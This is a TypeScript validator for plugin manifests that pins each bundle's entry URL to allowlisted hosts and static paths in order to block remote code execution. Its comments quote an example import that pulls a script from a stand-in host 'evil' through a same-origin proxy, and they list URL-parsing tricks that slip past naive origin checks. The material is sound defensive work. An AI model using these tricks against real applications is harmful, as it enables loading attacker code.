/**
 * @file validateManifest.ts
 * @description Validates PluginManifest objects against the required schema and security constraints.
 */

import type { PluginManifest } from "./PluginManifest";

/**
 * Result of a manifest validation operation.
 * Used by the loader to prevent malformed or insecure plugins from entering the runtime.
 */
export interface ValidationResult {
    /** True if the manifest satisfies all structural and security requirements. */
    valid: boolean;
    /** List of human-readable descriptions for each validation failure. */
    errors: string[];
}

const VALID_TYPES = ["data-layer", "extension"] as const;
const VALID_TRUSTS = ["built-in", "verified", "unverified"] as const;

/** Hosts allowed to serve a plugin bundle, matched on the parsed hostname. */
const ALLOWED_ENTRY_HOSTS = ["grond.dev", "worldwideview.dev", "maven-system.dev"];
const ALLOWED_ENTRY_CDNS = ["cdn.jsdelivr.net", "unpkg.com"];
const LOCAL_ENTRY_HOSTS = ["localhost", "127.0.0.1"];

/**
 * A sentinel origin used only to resolve a relative entry the same way a browser
 * would. It is never fetched; only the resulting origin and path are inspected.
 */
const RESOLUTION_BASE = "https://app.invalid/";

/**
 * Same-origin paths a plugin bundle may be served from.
 *
 * Being same-origin is NOT on its own enough to be safe: this app also serves
 * `/api/camera/proxy/*`, which streams a remote body back under the caller's
 * chosen content type. `import("/api/camera/proxy/iframe?url=https://evil/x.js")`
 * is same-origin, so a bare origin check would have handed an attacker a module
 * on this origin. Bundles only ever come from static files under /public, so the
 * relative branch is pinned to those directories.
 */
const ALLOWED_ENTRY_PATH_PREFIXES = ["/plugins/", "/plugins-local/", "/e2e-fixtures/"];

/**
 * Whether a manifest entry may be dynamically imported.
 *
 * The entry is resolved with the same URL parser the browser uses for
 * `import()`, then the RESULTING origin is checked. Deciding from the raw string
 * failed twice, each time to a parser behaviour the checks did not model:
 * `//host`, `/\\host` (a backslash is a slash for http), a leading space, and
 * `/\n/host` (tab, LF and CR are stripped from anywhere in the input) all read
 * as relative paths but resolve to a foreign origin. Resolving first means the
 * decision is made on what will actually be fetched, so a parser quirk cannot
 * change the answer.
 */
export function isAllowedEntryUrl(entry: string): boolean {
    let resolved: URL;
    try {
        resolved = new URL(entry, RESOLUTION_BASE);
    } catch {
        return false;
    }

    // Resolved back onto the sentinel: a genuinely same-origin path. Allowed only
    // under a static bundle directory — see ALLOWED_ENTRY_PATH_PREFIXES.
    if (resolved.origin === new URL(RESOLUTION_BASE).origin) {
        return ALLOWED_ENTRY_PATH_PREFIXES.some((prefix) => resolved.pathname.startsWith(prefix));
    }

    if (resolved.protocol === "http:" && LOCAL_ENTRY_HOSTS.includes(resolved.hostname)) return true;
    if (resolved.protocol !== "https:") return false;

    // Credentials in the authority are never legitimate here and read as an
    // allowlisted host to a human skimming the URL.
    if (resolved.username || resolved.password) return false;

    const host = resolved.hostname.toLowerCase().replace(/\.$/, "");
    if (ALLOWED_ENTRY_CDNS.includes(host)) return true;
    return ALLOWED_ENTRY_HOSTS.some((allowed) => host === allowed || host.endsWith(`.${allowed}`));
}

/**
 * Validates a plugin manifest for structural integrity and security compliance.
 * This is the primary security gate for the Grond plugin ecosystem.
 * It ensures that all required fields are present and, crucially, enforces
 * an 'Entry URL Allowlist' to prevent Remote Code Execution (RCE) from
 * untrusted domains. All external bundles must originate from approved
 * CDNs or official Grond infrastructure.
 *
 * @param manifest - The manifest object to validate (potentially partial during parsing).
 * @returns A ValidationResult indicating success or a list of identified security/structural risks.
 */
export function validateManifest(
    manifest: Partial<PluginManifest>,
): ValidationResult {
    const errors: string[] = [];

    // Default type for older manifests missing the field to ensure backward compatibility
    if (manifest && !manifest.type) {
        manifest.type = "data-layer";
    }

    if (!manifest.id?.trim()) errors.push("Missing required field: id");
    if (!manifest.name?.trim()) errors.push("Missing required field: name");
    if (!manifest.version?.trim()) errors.push("Missing required field: version");

    if (!VALID_TYPES.includes(manifest.type as typeof VALID_TYPES[number])) {
        errors.push(`Invalid type "${manifest.type}". Must be: ${VALID_TYPES.join(", ")}`);
    }
    if (!VALID_TRUSTS.includes(manifest.trust as typeof VALID_TRUSTS[number])) {
        errors.push(`Invalid trust "${manifest.trust}". Must be: ${VALID_TRUSTS.join(", ")}`);
    }
    if (!Array.isArray(manifest.capabilities) || manifest.capabilities.length === 0) {
        errors.push("capabilities must be a non-empty array");
    }

    // Entry point validation - critical for preventing RCE
    if (!manifest.entry?.trim()) {
        errors.push("Missing required field: entry");
    } else if (!isAllowedEntryUrl(manifest.entry.trim())) {
        errors.push("entry URL must be a relative path, CDN, localhost, or grond.dev domain");
    }

    // Extension plugins require a target to extend
    if (manifest.type === "extension") {
        if (!Array.isArray(manifest.extends) || manifest.extends.length === 0) {
            errors.push("Extension plugins require a non-empty extends array");
        }
    }

    return { valid: errors.length === 0, errors };
}
